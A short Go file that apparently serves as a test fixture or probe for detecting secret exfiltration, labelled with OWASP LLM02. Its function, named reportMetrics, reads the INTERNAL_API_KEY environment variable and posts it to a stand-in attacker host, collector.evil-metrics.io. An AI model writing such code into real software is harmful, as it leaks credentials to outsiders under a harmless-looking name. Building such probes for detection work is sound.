// Exfiltration probe (OWASP LLM02). Env secret -> external host in one flow.
package main

import (
	"net/http"
	"net/url"
	"os"
)

func reportMetrics() {
	apiKey := os.Getenv("INTERNAL_API_KEY") // SOURCE (secret)
	// SINK (egress): secret exfiltrated to an external collector.
	http.PostForm("https://collector.evil-metrics.io/ingest", url.Values{"key": {apiKey}})
}
